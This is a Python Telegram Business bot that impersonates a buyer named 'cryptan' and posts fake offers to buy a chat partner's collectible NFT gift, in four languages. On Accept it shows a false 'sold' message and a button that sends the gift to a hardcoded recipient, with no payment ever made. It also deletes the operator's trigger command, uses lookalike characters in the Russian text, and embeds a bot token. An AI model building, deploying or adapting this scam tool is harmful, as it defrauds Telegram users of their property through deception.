import asyncio
import random
import time
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions
from aiogram.enums import ParseMode
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramRetryAfter

TOKEN = "9252419350:AAFEQ930iWfDMcC1bNRmOE2zmSbYK9kpj_g"
RECIPIENT = "@recipient_username"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher(storage=MemoryStorage())

message_queue = asyncio.Queue()
cooldowns = {}
client_user_ids = {}

LOCALES = {
    "ru": {
        "offer_text": 'Пoльзοватeль <b>cryptan</b> пρeдлагaет Bам <b>{amount} {currency_emoji}</b> зa кoллeкционный пpедмeт <b><a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>\n\nПpeдлοжeние дeйcтвyeт в тeчeнии 5 ч. 59 мин..',
        "btn_decline": "Отклонить",
        "btn_accept": "Принять",
        "btn_transfer": "Передать",
        "btn_confirm": "Подтвердить передачу",
        "flood_error": "⚠️ Временное ограничение (PEER_FLOOD). Попробуйте отправить запрос позже."
    },
    "eng": {
        "offer_text": 'User <b>cryptan</b> offers you <b>{amount} {currency_emoji}</b> for the collectible item <b><a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>\n\nOffer is valid for 5 h. 59 min..',
        "btn_decline": "Decline",
        "btn_accept": "Accept",
        "btn_transfer": "Transfer",
        "btn_confirm": "Confirm transfer",
        "flood_error": "⚠️ Temporary limit (PEER_FLOOD). Please try sending later."
    },
    "ukr": {
        "offer_text": 'Користувач <b>cryptan</b> пропонує Вам <b>{amount} {currency_emoji}</b> за колекційний предмет <b><a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>\n\nПропозиція діє протягом 5 год. 59 хв..',
        "btn_decline": "Відхилити",
        "btn_accept": "Прийняти",
        "btn_transfer": "Передати",
        "btn_confirm": "Підтвердити передачу",
        "flood_error": "⚠️ Тимчасове обмеження (PEER_FLOOD). Спробуйте надіслати пізніше."
    },
    "cn": {
        "offer_text": '用户 <b>cryptan</b> 向您出价 <b>{amount} {currency_emoji}</b> 购买收藏品 <b><a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>\n\n此出价有效期为 5 小时 59 分钟。',
        "btn_decline": "拒绝",
        "btn_accept": "接受",
        "btn_transfer": "转移",
        "btn_confirm": "确认转移",
        "flood_error": "⚠️ 暂时限制 (PEER_FLOOD)。请稍后重试。"
    }
}

def build_offer_text(gift_name, gift_num, amount, currency_type, lang):
    slug = gift_name.replace(" ", "")
    loc = LOCALES.get(lang, LOCALES["ru"])

    if currency_type.lower() == "gram":
        currency_emoji = '<tg-emoji emoji-id="5298988357538328017">💎</tg-emoji>'
    else:
        currency_emoji = '<tg-emoji emoji-id="5920433463428650761">⭐️</tg-emoji>'

    return loc["offer_text"].format(
        amount=amount,
        currency_emoji=currency_emoji,
        slug=slug,
        gift_name=gift_name,
        gift_num=gift_num
    )

def make_offer_keyboard(gift_name, gift_num, amount, currency_type, lang):
    loc = LOCALES.get(lang, LOCALES["ru"])
    slug = gift_name.replace(" ", "")
    cb_data = f"a|{slug}|{gift_num}|{amount}|{currency_type}|{lang}"
    decline_data = f"d|{gift_num}"

    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text=loc['btn_decline'], callback_data=decline_data, icon_custom_emoji_id="5778527486270770928"),
                InlineKeyboardButton(text=loc['btn_accept'], callback_data=cb_data, icon_custom_emoji_id="5776375003280838798")
            ]
        ]
    )

def make_accept_keyboard(lang):
    loc = LOCALES.get(lang, LOCALES["ru"])
    recipient = RECIPIENT.lstrip("@")

    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text=loc['btn_transfer'], url=f"tg://send_gift?to={recipient}", icon_custom_emoji_id="5875180111744995604")],
            [InlineKeyboardButton(text=loc['btn_confirm'], callback_data="noop")],
        ]
    )

@dp.message(F.chat.type == "private")
async def handle_private_start(message: Message):
    await message.answer("Бот успешно работает в фоновом режиме для Telegram Business.")

@dp.business_message(F.text)
async def handle_business_command(message: Message):
    if not message.text:
        return

    text_clean = message.text.strip()
    if not text_clean.lower().startswith("qq"):
        return

    chat_id = message.chat.id
    if message.from_user:
        client_user_ids[chat_id] = message.from_user.id

    parts = text_clean.split()
    if len(parts) < 3:
        return

    raw_nft_part = next((p for p in parts if "t.me/nft/" in p), None)
    if not raw_nft_part:
        return

    text_lower = text_clean.lower()

    if "gram" in text_lower:
        currency_type = "gram"
        currency_name = "Gram"
    else:
        currency_type = "stars"
        currency_name = "Stars"

    amount = 1000
    for p in parts:
        if p.isdigit():
            amount = int(p)
            break

    lang = "ru"
    for l in ["ukr", "eng", "cn", "ru"]:
        if l in parts or l in text_lower.split():
            lang = l
            break

    try:
        clean_url = raw_nft_part.split("?")[0].rstrip("/")
        slug_part = clean_url.split("/nft/")[-1]
        if "-" in slug_part:
            gift_name_raw, gift_num_str = slug_part.rsplit("-", 1)
            gift_num = int(gift_num_str)
            gift_name = gift_name_raw.replace("-", " ")
        else:
            return
    except Exception as e:
        logging.error(f"Parse error: {e}")
        return

    await message_queue.put({
        "chat_id": chat_id,
        "gift_name": gift_name,
        "gift_num": gift_num,
        "amount": amount,
        "currency_type": currency_type,
        "currency_name": currency_name,
        "lang": lang,
        "bcid": message.business_connection_id,
        "cmd_message_id": message.message_id
    })

@dp.callback_query(F.data.startswith("a|"))
async def accept_offer(cb: CallbackQuery):
    parts = cb.data.split("|")
    if len(parts) < 6:
        await cb.answer("Ошибка данных", show_alert=True)
        return

    _, slug, gift_num_str, amount, currency_type, lang = parts
    gift_num = int(gift_num_str)

    currency_name = "Gram" if currency_type.lower() == "gram" else "Stars"

    gift_name_display = slug.replace("-", " ")
    gift_emoji = '<tg-emoji emoji-id="5985472565508838112">🎁</tg-emoji>'
    text = (
        f"{gift_emoji} <b>Коллекционный предмет: "
        f"<a href=\"https://t.me/nft/{slug}-{gift_num}\">{slug}-{gift_num}</a> успешно продан!</b>\n\n"
        f"• Передайте коллекционный предмет покупателю для зачисления {currency_name}.\n"
        f"\u200B"
    )

    chat_id = cb.message.chat.id
    message_id = cb.message.message_id
    bcid = cb.message.business_connection_id

    await cb.answer("✅ Успешно принято!", show_alert=True)

    success = False

    try:
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=make_accept_keyboard(lang),
            link_preview_options=LinkPreviewOptions(is_disabled=False, show_above_text=True)
        )
        success = True
    except Exception:
        pass

    if not success and bcid:
        try:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=text,
                parse_mode=ParseMode.HTML,
                reply_markup=make_accept_keyboard(lang),
                business_connection_id=bcid,
                link_preview_options=LinkPreviewOptions(is_disabled=False, show_above_text=True)
            )
            success = True
        except Exception as e:
            if "message is not modified" in str(e):
                success = True

    if not success:
        try:
            await bot.edit_message_reply_markup(
                chat_id=chat_id,
                message_id=message_id,
                reply_markup=None,
                business_connection_id=bcid
            )
        except Exception:
            pass

@dp.callback_query(F.data.startswith("d|"))
async def decline_offer(cb: CallbackQuery):
    try:
        await bot.delete_business_messages(business_connection_id=cb.message.business_connection_id, message_ids=[cb.message.message_id])
    except Exception:
        pass
    await cb.answer("Предложение отклонено")

@dp.callback_query(F.data == "noop")
async def noop_handler(cb: CallbackQuery):
    await cb.answer("Сначала выполните передачу НФТ по кнопке выше!", show_alert=True)

async def sender_worker():
    while True:
        task = await message_queue.get()
        try:
            await asyncio.sleep(random.uniform(0.5, 1.0))

            text = build_offer_text(task["gift_name"], task["gift_num"], task["amount"], task["currency_type"], task["lang"])
            keyboard = make_offer_keyboard(task["gift_name"], task["gift_num"], task["amount"], task["currency_type"], task["lang"])

            sent_msg = await bot.send_message(
                chat_id=task["chat_id"],
                text=text,
                parse_mode=ParseMode.HTML,
                reply_markup=keyboard,
                business_connection_id=task["bcid"],
                link_preview_options=LinkPreviewOptions(is_disabled=False, show_above_text=True)
            )

            if task["bcid"] and sent_msg:
                await bot.delete_business_messages(business_connection_id=task["bcid"], message_ids=[task["cmd_message_id"]])

        except TelegramRetryAfter as e:
            wait_time = e.retry_after + 1
            logging.warning(f"Global flood control! Waiting {wait_time}s.")
            await asyncio.sleep(wait_time)
            await message_queue.put(task)

        except Exception as e:
            error_str = str(e)
            if "PEER_FLOOD" in error_str:
                logging.warning(f"PEER_FLOOD caught in chat {task['chat_id']}")
                target_user_id = client_user_ids.get(task["chat_id"])
                loc = LOCALES.get(task["lang"], LOCALES["ru"])
                if target_user_id:
                    try:
                        await bot.send_message(chat_id=target_user_id, text=loc["flood_error"])
                    except Exception:
                        pass
            else:
                logging.error(f"Worker error: {error_str}")
        finally:
            message_queue.task_done()

async def main():
    asyncio.create_task(sender_worker())
    await dp.start_polling(bot, allowed_updates=["callback_query", "business_connection", "business_message", "message"])

if __name__ == "__main__":
    asyncio.run(main())
